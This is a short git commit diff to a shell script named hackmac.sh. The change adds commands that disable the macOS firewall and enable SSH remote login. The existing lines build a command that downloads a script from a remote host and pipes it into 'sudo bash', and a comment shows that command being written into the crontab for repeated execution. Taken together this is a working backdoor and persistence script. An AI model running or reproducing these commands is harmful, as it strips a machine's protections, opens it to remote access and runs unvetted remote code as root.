1f59400783ec887ab13487a8921371c58277a7fd
matthewpipie <matthewpipie@gmail.com>
2017-04-01 16:37:26 -0500

    Update hackmac.sh

--- hackmac.sh
+++ hackmac.sh
@@ -1,5 +1,11 @@
 #!/bin/bash
 
+#disable firewall
+sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0
+#enable ssh
+sudo systemsetup -f -setremotelogin on
+
+
 command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
 
 #write out current crontab
